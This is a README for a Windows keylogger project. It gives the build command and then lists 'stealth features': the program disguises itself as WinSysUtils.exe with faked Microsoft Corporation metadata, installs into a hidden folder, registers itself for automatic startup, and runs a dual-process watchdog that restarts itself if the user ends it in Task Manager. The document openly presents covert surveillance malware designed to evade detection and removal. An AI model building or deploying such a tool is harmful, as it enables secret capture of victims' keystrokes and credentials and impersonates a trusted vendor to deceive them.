# KeyLogger

Simple keylogger for Windows.

## Building

To build the project and get the executable:

```powershell
dotnet build -c Release
```

The executable will be located at `KeyLogger\bin\Release\WinSysUtils.exe`. When run, it will automatically install itself into a standard hidden folder, register for automatic startup, and start a watchdog system to prevent it from being easily closed.

Note: `dotnet publish` is not supported for this .NET Framework 4.8 project because it uses legacy ClickOnce tasks incompatible with the .NET Core MSBuild. Use `dotnet build` instead.

## Stealth Features

- **Identity**: The application appears as `WinSysUtils.exe` (Windows System Utility) with Microsoft Corporation metadata to blend in with system processes.
- **Resilience**: Uses a dual-process watchdog mechanism. If the main logger or the watchdog is killed (e.g., via Task Manager), the other will automatically restart it within seconds.
- **Installation**: Automatically installs to `%LOCALAPPDATA%\WindowsSystemUtility\`.

## Configuration

- `DISABLE_KEYLOGGER`: Set this environment variable to `true` to disable the keylogger.